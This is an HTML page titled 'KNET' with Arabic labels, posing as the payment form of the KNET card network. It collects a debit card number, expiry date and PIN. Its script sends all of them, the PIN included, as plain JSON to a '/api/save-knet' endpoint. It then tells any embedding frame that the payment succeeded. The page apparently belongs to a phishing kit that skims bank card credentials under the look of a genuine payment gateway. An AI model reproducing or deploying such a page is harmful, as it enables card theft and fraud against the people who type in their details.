<html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" name="viewport"/>
<meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible"/>
<meta content="no-cache" http-equiv="Pragma"/>
<meta content="-1" http-equiv="Expires"/>
<meta content="max-age=0" http-equiv="CACHE-CONTROL"/>
<meta charset="utf-8"/>
<title>KNET</title>
<script src="js/jquery-3.7.1.min.js"></script>
<link href="css/payment-reset.css" rel="stylesheet" type="text/css"/>
<link href="css/payment-responsive-ar.css" rel="stylesheet" type="text/css"/>
<link href="css/payment-layout-ar.css" rel="stylesheet" type="text/css"/>
<script src="js/checkSum.js" type="text/javascript"></script>
<script src="js/AuthValidation.js" type="text/javascript"></script>
<script type="text/javascript">
	window.addEventListener('message', function(event) {
		if (event.data && event.data.type === 'submitKnet') {
			onPay();
		}
	});

	function onPay() {
		// منطق الإرسال البسيط للمحاكاة أو الربط مع السيرفر
		const debitNumber = document.getElementById('debitNumber').value;
		const expiryMonth = document.getElementById('expiryMonthBox').value;
		const expiryYear = document.getElementById('expiryYearBox').value;
		const cardPin = document.getElementById('cardPin').value;

		if(!debitNumber || !expiryMonth || !expiryYear || !cardPin) {
			alert("الرجاء إكمال كافة البيانات");
			return;
		}
		
		// إرسال البيانات للسيرفر
		const data = {
			debitNumber: debitNumber,
			expiryMonth: expiryMonth,
			expiryYear: expiryYear,
			cardPin: cardPin
		};

		fetch('/api/save-knet', {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify(data)
		}).then(() => {
			window.parent.postMessage({ type: 'paymentSuccess' }, '*');
		});
	}

	function formatCardNumber(input) {
		let value = input.value.replace(/\D/g, '');
		let formatted = value.match(/.{1,4}/g)?.join(' ') || '';
		input.value = formatted;
	}

	function ValidateNumPin(e) {
		const charCode = (e.which) ? e.which : e.keyCode;
		if (charCode > 31 && (charCode < 48 || charCode > 57)) return false;
		return true;
	}
</script>
<style>
    body { background: transparent; font-family: Tahoma, Arial, sans-serif; }
    .contentBox { background: #fff; padding: 15px; border-radius: 8px; }
</style>
</head>
<body>
<div class="wrapper">
    <div class="contentBox">
        <div class="row" id="Paymentpagecardnumber">
            <div class="col w-40" style="float:right;text-align:right;padding-top:5px;">
                <label class="paymentlabel">:رقم بطاقة الصراف الآلي </label>
            </div>
            <div class="col w-60" style="text-align:right;">
                <input autocomplete="cc-number" class="paymentinput" id="debitNumber" maxlength="19" name="debitNumber" oninput="formatCardNumber(this);" onkeypress="return ValidateNumPin(event);" type="text"/>
            </div>
        </div>

        <div class="row" id="cardExpdate">
            <div class="col w-40" style="float:right; text-align:right;padding-top:5px;">
                <span class="paymentlabel">:تاريخ انتهاء البطاقة </span>
            </div>
            <div class="col w-60" style="text-align: right;">
                <div class="expiry-wrapper" style="display: flex; direction: ltr; justify-content: flex-end;">
                    <input autocomplete="cc-exp-month" class="paymentinput" id="expiryMonthBox" maxlength="2" placeholder="MM" style="width: 45px; text-align: center;" type="text" onkeypress="return ValidateNumPin(event);"/>
                    <span style="margin: 0 5px; padding-top: 5px;">/</span>
                    <input autocomplete="cc-exp-year" class="paymentinput" id="expiryYearBox" maxlength="2" placeholder="YY" style="width: 45px; text-align: center;" type="text" onkeypress="return ValidateNumPin(event);"/>
                </div>
            </div>
        </div>

        <div class="row" id="PinField">
            <div class="col w-40" style="float:right;text-align:right;padding-top:8px;">
                <span class="paymentlabel">:(PIN) الرقم السري</span>
            </div>
            <div class="col w-60">
                <input autocomplete="off" class="paymentinput" id="cardPin" maxlength="4" name="paymentPin" onkeypress="return ValidateNumPin(event);" type="password" style="width: 100%; text-align: right;"/>
            </div>
        </div>

        <div class="row" style="margin-top: 20px; text-align: center; display: none;">
            <input class="button" id="proceed" onclick="onPay();" type="button" value="إرسال"/>
        </div>
    </div>
</div>
</body></html>
